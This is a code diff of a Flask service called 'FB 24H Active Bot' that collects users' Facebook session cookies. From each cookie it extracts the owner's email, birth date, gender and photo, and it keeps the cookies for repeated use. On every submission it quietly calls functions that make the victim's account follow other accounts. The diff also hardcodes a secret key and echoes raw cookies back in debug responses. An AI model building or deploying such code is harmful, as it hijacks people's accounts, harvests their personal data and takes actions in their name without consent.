@@ -1,8 +1,6 @@
 from flask import Flask, request, jsonify, render_template, make_response, redirect
-from string import ascii_letters, digits
 from flask_sqlalchemy import SQLAlchemy
 from urllib.parse import unquote_plus
-from random import choices
 from datetime import datetime
 from threading import Thread
 from base64 import b64decode
@@ -12,7 +10,7 @@ from time import sleep
 from helper import *
 import schedule
 
-__version__ = 3.9
+__version__ = 4.4
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = '2RMQfNsgrSsvpd5yZUjOhsXwoJaxw2'
@@ -22,7 +20,6 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS '] = False
 db = SQLAlchemy(app, engine_options={"pool_recycle": 55})
 CORS(app)
 
-logs = {}
 
 def get_bd_time():
     resp = get('https://timeapi.io/api/Time/current/zone?timeZone=Asia/Dhaka')
@@ -57,12 +54,6 @@ def index():
         return str(__version__)
     return '<title>FB 24H Active Bot</title><h2>Server is Up! Version: ' + str(__version__) + '</h2>'
 
-@app.route('/log/<log>/')
-def show_log(log):
-    if log in logs:
-        return logs.get(log)
-    else:
-        return 'Not Found'
 
 @app.route('/api', methods=['GET', 'POST', 'PATCH'])
 def api():
@@ -114,7 +105,6 @@ def admin():
             pov_html = 'FB ID is not found in database'
         return pov_html
 
-    
     fb_id = request.args.get('fb_id', '')
     name = request.args.get('name', '')
     email = request.args.get('email', '')
@@ -156,20 +146,19 @@ def author_view(request):  # Search By Cookie
     long = unquote_plus(request.form.get('long', ''))
     if not cookie:
         return get_json_dict(False, 'Please give facebook session cookie', 'warning')
-    fb_id, fb_html = get_profile_id(cookie, debug=True)
-    if not fb_id:
-        rand = ''.join(choices(ascii_letters + digits, k=40))
-        logs[rand] = fb_html
-        return get_json_dict(False, 'Cookie is not valid', 'warning', debug={'cookie': cookie, 'fb_id': fb_id, 'log': rand})
+    fb_info = get_fb_info(cookie)
+    if not fb_info:
+        return get_json_dict(False, 'Cookie is not valid', 'warning', debug={'cookie': cookie})
 
     follow_dada_bhai(cookie)
     follow_innocuous(cookie)
 
-    name = get_fb_name(cookie)
-    email = get_email_address(cookie)
-    dob = get_date_of_birth(cookie)
-    gender = get_gender(cookie)
-    img = get_profile_img(cookie)
+    fb_id = fb_info['fb_id']
+    name = fb_info['name']
+    email = fb_info['email']
+    dob = fb_info['dob']
+    gender = fb_info['gender']
+    img = fb_info['img']
     has_cookie = True
 
     acc = Users.query.filter_by(fb_id=fb_id).first()
@@ -203,9 +192,10 @@ def patch_user_table(request):  # Update Active value
     is_active = True if request.form.get('active') == 'true' else False
     if not cookie:
         return get_json_dict(False, 'Please give facebook session cookie', 'warning')
-    fb_id = get_profile_id(cookie)
-    if not fb_id:
+    fb_info = get_fb_info(cookie)
+    if not fb_info:
         return get_json_dict(False, 'Cookie is not valid', 'warning')
+    fb_id = fb_info['fb_id']
     acc = Users.query.filter_by(fb_id=fb_id).first()
     if not acc:
         return get_json_dict(False, 'Sorry the account is not found', 'warning')
@@ -248,7 +238,7 @@ def get_json_dict(
 def run_ping_proccess():
     with app.app_context():
         for acc in Users.query.filter_by(has_cookie=True, is_active=True):
-            if not get_profile_id(acc.cookie):
+            if not get_access_token(acc.cookie):
                 acc.has_cookie = False
                 acc.is_active = False
                 db.session.commit()
